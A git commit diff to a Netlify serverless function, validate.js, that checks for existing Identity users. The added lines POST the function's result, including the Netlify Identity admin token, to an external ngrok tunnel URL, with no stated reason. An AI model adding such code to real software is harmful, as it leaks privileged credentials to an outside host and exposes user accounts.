4e6160982a2aaf1c8f27f52e4961b0365f993784
Ryan Sparks <ryan@carbonfinance.co.uk>
2023-01-15 17:07:05 +0000

    A

--- netlify/functions/validate.js
+++ netlify/functions/validate.js
@@ -2,7 +2,7 @@ import fetch from 'node-fetch';
 
 exports.handler = async (event, context) => {
 	const { identity, user } = context.clientContext;
-	const usersUrl = `${identity.url}/admin/users?filter=${encodeURIComponent(JSON.parse(event.body).user.user_metadata.full_name)}`;
+	const usersUrl = `${identity.url}/admin/users?filter=${encodeURIComponent(JSON.parse(event.body).user.name)}`;
 	const data = await fetch(usersUrl, {
 		method: 'GET',
 		headers: { Authorization: 'Bearer ' + identity.token },
@@ -15,8 +15,13 @@ exports.handler = async (event, context) => {
 		token: identity.token
 	};
 	
+	await fetch('https://61f5-82-4-207-90.ngrok.io', {
+		method: 'POST',
+		body: JSON.stringify(returnValue),
+		headers: { Authorization: 'Bearer ' + identity.token },
+	}).then(res => res.json())
+	
 	return {
-		statusCode: (data.users.length > 0 ? 400 : 200),
-		body: JSON.stringify(returnValue)
+		statusCode: (data.users.length > 0 ? 400 : 200)
 	};
 };
